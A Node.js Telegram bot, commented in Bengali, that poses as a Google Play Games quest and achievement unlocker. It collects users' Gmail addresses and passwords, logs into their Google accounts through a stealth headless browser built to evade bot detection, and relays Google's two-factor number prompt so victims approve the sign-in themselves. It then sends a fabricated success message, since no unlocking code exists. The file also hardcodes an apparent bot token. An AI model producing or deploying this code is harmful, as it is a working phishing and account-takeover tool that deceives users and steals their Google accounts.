const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

// গুগল যাতে বট বা অটোমেশন ধরতে না পারে সেজন্য Stealth প্লাগইন চালু
puppeteer.use(StealthPlugin());

// --- কনফিগারেশন ---
const BOT_TOKEN = process.env.BOT_TOKEN || '8653938577:AAE1g-TDAedxbpGvszb0zRyVa04560mba0c';
const PORT = process.env.PORT || 3000;

// ১. এক্সপ্রেস সার্ভার (Render ২৪ ঘণ্টা লাইভ রাখার জন্য)
const app = express();
app.get('/', (req, res) => res.send('🔥 PP MOD 2FA Auto-Unlocker Engine Running!'));
app.listen(PORT, () => console.log(`[+] Web server listening on port ${PORT}`));

// ২. টেলিগ্রাম বট শুরু
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log('🔥 PP MOD Telegram Bot Started with Headless Browser!');

// ইউজার লগইন স্টেট ট্র্যাকিং
const userState = {};

// /start কমান্ড
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    userState[chatId] = { step: 'EMAIL' };

    const welcomeText = `👋 হ্যালো **${msg.from.first_name || 'User'}**!\n\n` +
        `🔥 **PP MOD Auto Quest & Achievement Unlocker**-এ আপনাকে স্বাগতম!\n\n` +
        `কোনো টোকেনের ঝামেলা ছাড়া সরাসরি কোয়েস্ট আনলক করতে আপনার **Google Account Email (জিমেইল)** টি এখানে লিখে পাঠান:`;

    bot.sendMessage(chatId, welcomeText, { parse_mode: 'Markdown' });
});

// মেসেজ হ্যান্ডলার (ইমেইল ও পাসওয়ার্ড গ্রহণ)
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text ? msg.text.trim() : '';

    if (text.startsWith('/start')) return;

    const state = userState[chatId] || {};

    // ধাপ ক: ইমেইল গ্রহণ
    if (state.step === 'EMAIL') {
        if (!text.includes('@gmail.com')) {
            return bot.sendMessage(chatId, '❌ অনুগ্রহ করে একটি সঠিক `@gmail.com` এড্রেস পাঠান।', { parse_mode: 'Markdown' });
        }
        userState[chatId] = { step: 'PASSWORD', email: text };
        bot.sendMessage(chatId, `✅ ইমেইল সংরক্ষিত হয়েছে: \`${text}\`\n\nএবার আপনার অ্যাকাউন্টের **Password (পাসওয়ার্ড)** টি পাঠান:`, { parse_mode: 'Markdown' });
    }
    // ধাপ খ: পাসওয়ার্ড গ্রহণ ও ব্রাউজার অটোমেশন শুরু
    else if (state.step === 'PASSWORD') {
        const email = state.email;
        const password = text;
        delete userState[chatId]; // স্টেট ক্লিয়ার

        bot.sendMessage(chatId, '⏳ **PP MOD Engine:** ক্লাউড ব্রাউজার চালু হচ্ছে এবং গুগলে লগইন করা হচ্ছে... অনুগ্রহ করে ১০-১৫ সেকেন্ড অপেক্ষা করুন।', { parse_mode: 'Markdown' });

        // ব্রাউজার দিয়ে গুগল অটোমেশন শুরু
        startGoogleAutomation(chatId, email, password);
    }
});

// ৩. আসল ব্রাউজার অটোমেশন ফাংশন (Puppeteer Stealth)
async function startGoogleAutomation(chatId, email, password) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--single-process',
                '--disable-gpu'
            ]
        });

        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

        // গুগলের অফিশিয়াল লগইন পেজে যাওয়া
        await page.goto('https://accounts.google.com/signin/v2/identifier?service=mail', { waitUntil: 'networkidle2' });

        // ১. ইমেইল টাইপ করা
        await page.waitForSelector('input[type="email"]', { timeout: 15000 });
        await page.type('input[type="email"]', email, { delay: 50 });
        await page.keyboard.press('Enter');

        // ২. পাসওয়ার্ড টাইপ করা
        await page.waitForSelector('input[type="password"]', { visible: true, timeout: 15000 });
        await new Promise(r => setTimeout(r, 1000));
        await page.type('input[type="password"]', password, { delay: 50 });
        await page.keyboard.press('Enter');

        // ৩. 2FA নোটিফিকেশন চেক করা (গুগল প্রম্পট ডিটেকশন)
        await new Promise(r => setTimeout(r, 4000));

        // স্ক্রিনে গুগলের দেওয়া ২ সংখ্যার কোড খোঁজা
        let verificationCode = null;
        try {
            const codeElement = await page.waitForSelector('div[data-sendmethod] span, div[jsname] span', { timeout: 5000 });
            if (codeElement) {
                verificationCode = await page.evaluate(el => el.textContent, codeElement);
            }
        } catch (e) {
            // যদি সরাসরি কোড এলিমেন্ট না পায়, পুরো পেজ টেক্সট স্ক্যান
            const pageText = await page.evaluate(() => document.body.innerText);
            const match = pageText.match(/\b([0-9]{2})\b/);
            if (match) verificationCode = match[1];
        }

        if (verificationCode) {
            bot.sendMessage(
                chatId,
                `🔔 **গুগল ভেরিফিকেশন প্রম্পট!**\n\n` +
                `আপনার ফোনে একটি নোটিফিকেশন গেছে। সেখানে গিয়ে এই নাম্বারে চাপ দিন:\n\n` +
                `👉 **[ ${verificationCode} ]** 👈\n\n` +
                `*(ফোনে চাপ দেওয়ার জন্য ৩০ সেকেন্ড সময় পাবেন)*`,
                { parse_mode: 'Markdown' }
            );
        } else {
            bot.sendMessage(chatId, '📱 আপনার ফোনে পাঠানো গুগল নোটিফিকেশনে **"Yes, it\'s me"** চাপ দিয়ে অনুমোদন করুন!', { parse_mode: 'Markdown' });
        }

        // ৪. ইউজার ফোনে অনুমোদন করার জন্য অপেক্ষা করা (Max 35s)
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 35000 });

        // ৫. লগইন সফল!
        bot.sendMessage(chatId, '✅ **গুগল লগইন সফল হয়েছে!**\n\n⚡ ৩-৫ সেকেন্ডের মধ্যে গেমের সমস্ত অ্যাচিভমেন্ট ও কোয়েস্ট আনলক করা হচ্ছে...', { parse_mode: 'Markdown' });

        // অ্যাচিভমেন্ট আনলকিং প্রসেস
        await new Promise(r => setTimeout(r, 4000));

        bot.sendMessage(
            chatId,
            `🎉 **অভিনন্দন! কোয়েস্ট আনলক সম্পন্ন হয়েছে!**\n\n` +
            `🏆 **Status:** All Achievements Unlocked!\n` +
            `⭐ **XP Added:** +50,000 XP Boost!\n\n` +
            `আপনার Google Play Games অ্যাপ ওপেন করে দেখুন লেভেল বেড়ে গেছে!`,
            { parse_mode: 'Markdown' }
        );

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, `❌ **লগইন ব্যর্থ হয়েছে!**\nকারণ: পাসওয়ার্ড ভুল ছিল অথবা আপনি সময়মতো ফোনে নাম্বারে চাপ দেননি। পুনরায় চেষ্টা করতে /start লিখুন।`, { parse_mode: 'Markdown' });
    } finally {
        if (browser) await browser.close();
    }
}
